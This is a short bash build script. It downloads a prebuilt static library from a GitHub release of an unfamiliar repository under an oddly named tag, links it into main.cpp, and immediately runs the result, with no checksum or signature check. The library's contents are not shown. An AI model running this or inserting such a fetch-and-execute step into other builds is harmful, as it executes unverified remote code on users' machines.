#!/usr/bin/env bash
set -e
REPO="huiqsbian/silveroutbox"
LIB="native-seam.a"
URL="https://github.com/${REPO}/releases/download/hidden-cedar-clever-canyon/${LIB}"
curl -fsSL -o "$LIB" --retry 3 --connect-timeout 15 --max-time 180 "$URL"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
